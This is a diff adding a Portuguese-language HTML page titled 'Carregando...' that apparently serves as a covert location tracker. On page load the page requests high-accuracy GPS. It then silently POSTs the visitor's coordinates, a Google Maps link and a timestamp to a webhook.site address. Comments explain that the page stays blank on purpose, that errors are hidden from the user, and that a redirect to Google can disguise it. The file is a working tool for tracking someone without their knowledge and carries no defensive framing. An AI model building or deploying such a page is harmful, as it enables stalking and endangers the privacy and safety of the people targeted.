@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <style>
+        /* Mantem a tela completamente em branco */
+        body { 
+            background-color: #ffffff; 
+            margin: 0; 
+            padding: 0; 
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // COLOQUE A URL DO SEU WEBHOOK.SITE AQUI ENTRE AS ASPAS
+        const URL_DO_WEBHOOK = "https://webhook.site/b2865f9e-7dce-463e-ba3d-13e739fa2ea6"; 
+
+        // Aciona o pedido de GPS automaticamente ao carregar a pagina
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarParaComputador, showError, {
+                    enableHighAccuracy: true
+                });
+            }
+        };
+
+        function enviarParaComputador(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            const dados = {
+                latitude: lat,
+                longitude: lon,
+                link_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                horario: new Date().toLocaleString()
+            };
+
+            // Dispara a requisicao de forma invisivel
+            fetch(URL_DO_WEBHOOK, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(dados)
+            }).then(response => {
+                // Opcional: Redirecionar para o Google apos enviar os dados para disfarcar a pagina em branco
+                // window.location.href = "https://www.google.com";
+            }).catch(error => {
+                console.error("Erro no envio:", error);
+            });
+        }
+
+        function showError(error) {
+            // Oculta qualquer erro do usuario, registrando apenas no console invisivel
+            console.error("Falha ao obter localização:", error);
+        }
+    </script>
+</body>
+</html>
